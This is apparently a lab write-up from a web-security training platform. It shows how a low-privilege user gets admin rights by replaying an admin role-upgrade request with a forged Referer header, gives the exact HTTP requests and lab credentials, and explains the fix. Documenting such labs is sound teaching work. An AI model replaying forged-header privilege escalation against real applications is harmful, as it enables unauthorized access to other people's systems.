# Referer-Based Access Control

## Lab

**Referer-based access control**

## Objective

Exploit an access control vulnerability where the application trusts the `Referer` HTTP header to determine whether a request came from the administrator page.

## Vulnerability

The application incorrectly uses the `Referer` header as part of its authorization check.

The server expects sensitive requests to contain:

```http
Referer: https://LAB-ID.web-security-academy.net/admin
```

However, the `Referer` header can be controlled by the attacker.

---

## Exploitation

### 1. Login as Administrator

Logged in with:

```text
Username: administrator
Password: admin
```

Opened the `/admin` panel and identified the legitimate role-upgrade request:

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Referer: https://LAB-ID.web-security-academy.net/admin
```

This showed that the application expected requests from `/admin`.

---

### 2. Switch to Wiener Session

Changed the session to the low-privileged `wiener` account.

The important part was keeping the administrator-looking `Referer`:

```http
Referer: https://LAB-ID.web-security-academy.net/admin
```

---

### 3. Change the Target User

Changed the request from:

```http
username=carlos&action=upgrade
```

to:

```http
username=wiener&action=upgrade
```

Final request:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Referer: https://LAB-ID.web-security-academy.net/admin
```

The request was sent using the **Wiener session**.

---

## Result

The server accepted the request and upgraded `wiener` to an administrator.

The lab was successfully solved.

---

## Why Did It Work?

The server incorrectly trusted:

```http
Referer: /admin
```

as evidence that the request came from an administrator.

But `Referer` only tells the server what page the request claims to come from.

It does **not** prove the user's identity or privileges.

### Normal flow

```text
Admin opens /admin
        ↓
Admin performs upgrade
        ↓
Referer: /admin
        ↓
Server accepts request
```

### Exploited flow

```text
Wiener session
      +
Referer: /admin
      ↓
Server thinks request is from admin
      ↓
Wiener gets upgraded
```

---

## Key Lesson

> **Never use the Referer header as authorization.**

Authorization must be based on the authenticated user's actual privileges, not on a client-controlled HTTP header.

### Memory Trick

```text
Referer-based access control
        ↓
Server trusts "where the request came from"
        ↓
Attacker changes/forges Referer
        ↓
Access control bypass
```

## Burp Suite Techniques Used

* Intercepted requests
* Identified the legitimate admin request
* Switched sessions
* Modified URL parameters
* Preserved the `Referer` header
* Replayed the request

##
